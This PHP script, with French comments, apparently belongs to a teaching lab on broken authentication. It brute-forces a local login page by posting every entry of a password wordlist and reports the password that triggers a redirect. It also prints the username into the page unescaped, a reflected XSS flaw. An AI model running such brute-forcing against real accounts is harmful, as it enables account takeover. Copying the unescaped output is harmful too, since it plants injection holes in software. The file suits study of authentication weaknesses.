<?php

include_once './../../fragments/header.php';
echo '<div class="container mt-5">';

// Si le paramètre username est renseigné
if (isset($_GET['username'])) {

    // Récupération de l'identifiant dont on cherche le mot de passe
    $username = $_GET['username'];
    // Ouverture du fichier contenant les mots de passe
    $passwords_list = fopen("./../french_passwords.txt", "r");

    if ($passwords_list) {
        // Variable valant vrai si le mot de passe a été trouvé
        $is_password_found = false;
        // Lecture de chaque ligne dans la variable $password        
        while (($password = fgets($passwords_list)) !== false) {
            // Trim permet d'éliminer les retours à la ligne
            $password = trim($password);
            // Tableau contenant les informations de connexion
            $params = [
                "username" => $username,
                "password" => $password
            ];

            // Création d'une session CURL POST vers /2-broken-authentication/connexion.php
            // Cela permet d'effectuer une requête HTTP
            $connect_request = curl_init();

            // Définition de l'URI
            curl_setopt($connect_request, CURLOPT_URL, "http://localhost/02-broken-authentication/connexion.php");
            // La requête HTTP passe en POST
            curl_setopt($connect_request, CURLOPT_POST, true);
            // Définition des paramètres username et password
            curl_setopt($connect_request, CURLOPT_POSTFIELDS, $params);
            // Signifie qu'on n'affiche pas la page obtenue grâce à curl
            curl_setopt($connect_request, CURLOPT_RETURNTRANSFER, true);

            // Exécution de la requête
            $output = curl_exec($connect_request);

            // Récupération du code HTTP retourné
            $http_reponse_code = curl_getinfo($connect_request, CURLINFO_HTTP_CODE);

            // Fermeture de la session CURL
            curl_close($connect_request);

            // Si le code retourné est 302, il y a eu une redirection
            if ($http_reponse_code === 302) {
                echo "<div class=\"alert alert-success\">Mot de passe trouvé pour l'utilisateur <strong>$username</strong> : <strong>$password</strong>.</div>";
                $is_password_found = true;
                // Sortie de la boucle while
                break;
            }
        }

        // Si le mot de passe n'a pas été trouvé
        if (!$is_password_found) {
            echo "<div class=\"alert alert-danger\">Aucun mot de passe trouvé pour l'utilisateur <strong>$username</strong>.</div>";
        }

        // Fermeture du fichier
        fclose($passwords_list);
    }
} else {
    echo "<div class=\"alert alert-danger\">Le paramètre GET <strong>username</strong> est obligatoire.</div>";
}

echo '</div>';
include_once './../../fragments/footer.php';